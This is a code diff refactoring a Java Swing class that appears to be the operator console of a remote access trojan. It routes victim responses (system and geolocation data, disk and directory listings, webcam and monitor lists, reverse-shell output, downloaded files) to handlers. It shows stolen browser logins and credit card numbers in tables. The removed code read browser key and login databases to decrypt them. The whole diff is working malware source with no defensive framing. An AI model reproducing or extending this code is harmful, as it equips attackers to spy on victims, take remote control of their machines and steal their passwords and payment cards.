@@ -1,11 +1,14 @@
 package Utilities;
 
 import Main.Main;
+import Packets.Identificators.Response;
+import Packets.SysNetInfo.Information;
 import Packets.SysNetInfo.NetworkInformation;
 import Packets.SysNetInfo.SystemInformation;
 import ProgressBar.Bar;
 import Server.ServerGUI;
 import TableUtils.Credentials.CredentialsManagerGUI;
+import Utils.Converter;
 import Utils.CredentialsDumper;
 import Packets.Credentials.AccountCredentials;
 import Packets.Credentials.CombinedCredentials;
@@ -26,11 +29,10 @@ import java.awt.*;
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
-import java.util.ArrayList;
-import java.util.Arrays;
+import java.util.*;
 import java.util.List;
-import java.util.Objects;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.function.Consumer;
 
 public class SwingUpdater implements UpdaterInterface {
 
@@ -52,35 +54,30 @@ public class SwingUpdater implements UpdaterInterface {
 
     private final WindowHandler<FileManagerGUI> fileManagerWindowHandler = new WindowHandler<>();
 
+    private final Map<Response, Consumer<JSONObject>> mapOfResponses = new HashMap<>();
+
     public void closeFileManagerWindowHandler(byte id){
         fileManagerWindowHandler.finishInstance(id);
     }
 
-    private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
-        String operatingSystem = jsonObject.getString("win_ver");
-        String userProfile = jsonObject.getString("user_profile");
-        String homePath = jsonObject.getString("home_path");
-        String homeDrive = jsonObject.getString("home_drive");
-        String username = jsonObject.getString("username");
-        JSONArray userDisksJsonArray = jsonObject.getJSONArray("disks");
-        List<String> listOfDisks = userDisksJsonArray.toList().stream()
-                .map(Object::toString)
-                .toList();
-        String tagName = jsonObject.getString("tag_name");
-        boolean webcam = jsonObject.getBoolean("webcam");
-        boolean keylogger = jsonObject.getBoolean("keylogger");
-        String uuid = jsonObject.getString("mutex");
-        systemInformation = new SystemInformation(operatingSystem, userProfile, homePath, homeDrive, username, listOfDisks, tagName, webcam, keylogger, uuid);
-        String ip = jsonObject.getString("query");
-        String internetCompanyName = jsonObject.getString("isp");
-        String userContinent = jsonObject.getString("continent");
-        String userCountry = jsonObject.getString("country");
-        String userRegion = jsonObject.getString("region");
-        String userCity = jsonObject.getString("city");
-        String userZone = jsonObject.getString("timezone");
-        String userCurrency = jsonObject.getString("currency");
-        boolean userProxy = jsonObject.getBoolean("proxy");
-        networkInformation = new NetworkInformation(ip, internetCompanyName, userContinent, userCountry, userRegion, userCity, userZone, userCurrency, userProxy);
+
+    public SwingUpdater() {
+        setupMapOfResponses();
+    }
+
+
+
+    private void setupMapOfResponses() {
+        mapOfResponses.put(Response.SYS_NET_INFO, this::addRowOfNewConnection);
+        mapOfResponses.put(Response.DISKS, this::updateDisks);
+        mapOfResponses.put(Response.DIRECTORY, this::updateDirectory);
+        mapOfResponses.put(Response.WEBCAM_DEVICES, this::updateWebcamDevices);
+        mapOfResponses.put(Response.SCREEN_DIMENSIONS, this::setScreenDimensions);
+        mapOfResponses.put(Response.MONITORS, this::updateMonitors);
+        mapOfResponses.put(Response.SHELL, this::updateReverseShell);
+        mapOfResponses.put(Response.PERMISSIONS, this::showPermissionStatus);
+        mapOfResponses.put(Response.SHOW_DOWNLOADED, this::showDownloadedFiles);
+        mapOfResponses.put(Response.DUMP_CREDENTIALS, this::updateCredentialsDumper);
     }
 
     public int getPositionOfExisting(String identifier, TableModel tableModel) {
@@ -110,7 +107,9 @@ public class SwingUpdater implements UpdaterInterface {
     }
 
     public void addRowOfNewConnection(JSONObject jsonObject) {
-        convertJSON2NetAndSysInfo(jsonObject);
+        Information information = Converter.convertJSON2NetAndSysInfo(jsonObject);
+        systemInformation = information.systemInformation();
+        networkInformation = information.networkInformation();
         SwingUtilities.invokeLater(() -> {
             String identifier = systemInformation.UUID();
             TableModel tableModel = Main.gui.getConnectionsTable().getModel();
@@ -268,29 +267,38 @@ public class SwingUpdater implements UpdaterInterface {
         });
     }
 
-    public void updateCredentialsDumper(String path) {
-        byte[] secretKeyBytes;
-        try {
-            secretKeyBytes = Files.readAllBytes(new File(path + "\\Encryption Key").toPath());
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
-        CredentialsDumper credentialsDumper = new CredentialsDumper(secretKeyBytes, path + "\\Login Data", path + "\\Web Data");
-        CombinedCredentials combinedCredentials = credentialsDumper.getCredentials();
-        ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
-        ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
+    public void updateCredentialsDumper(JSONObject jsonObject) {
+        jsonObject = jsonObject.getJSONObject("info");
+        JSONArray accountCredentialsArray = jsonObject.getJSONArray("accountCredentials");
+        JSONArray creditCardCredentialsArray = jsonObject.getJSONArray("creditCardCredentials");
         SwingUtilities.invokeLater(() -> {
-            for (AccountCredentials e : accountCredentials) {
-                Object[] elements = {e.actionUrl(), e.originUrl(), e.username(), e.password(), e.creationDate(), e.lastUsedDate()};
+            for (int i = 0; i < accountCredentialsArray.length(); i++) {
+                JSONObject e = accountCredentialsArray.getJSONObject(i);
+                Object[] elements = {
+                        e.getString("actionUrl"),
+                        e.getString("originUrl"),
+                        e.getString("username"),
+                        e.getString("password"),
+                        e.getLong("creationDate"),
+                        e.getLong("lastUsedDate")
+                };
                 credentialsManagerGUI.getAccountsTableModel().addRow(elements);
             }
-            for (CreditCardCredentials e : creditCardCredentials) {
-                Object[] elements = {e.creditCardNumber(), e.expirationMonth(), e.expirationYear(), e.cardHolder()};
+            for (int i = 0; i < creditCardCredentialsArray.length(); i++) {
+                JSONObject e = creditCardCredentialsArray.getJSONObject(i);
+                Object[] elements = {
+                        e.getString("creditCardNumber"),
+                        e.getInt("expirationMonth"),
+                        e.getInt("expirationYear"),
+                        e.getString("cardHolder")
+                };
                 credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
             }
+
             credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
         });
     }
+
 
     public void showPermissionStatus(JSONObject jsonObject) {
         int result = jsonObject.getInt("result");
@@ -311,15 +319,30 @@ public class SwingUpdater implements UpdaterInterface {
         });
     }
 
-    @Override
-    public void showDownloadedFiles(String outputFolder) {
-        FolderOpener.open(outputFolder);
+    public void processMessage(String message) {
+        JSONObject object = new JSONObject(message);
+        Consumer<JSONObject> action = mapOfResponses.get(Response.valueOf(object.getString("RESPONSE")));
+        if (action != null) {
+            action.accept(object);
+        } else {
+            System.out.println("Action not found!");
+        }
+    }
+
+
+    public void showDownloadedFiles(JSONObject jsonObject) {
+        FolderOpener.open(jsonObject.getString("path"));
     }
 
     @Override
     public void updateDownloadState(byte id, int read, boolean isLastPacket) {
         Bar<?> bar = mapOfProgressBars.get(id);
         if (bar != null) bar.updateProgress(read, isLastPacket);
+    }
+
+    @Override
+    public Information getInformation() {
+        return null;
     }
 
     @Override
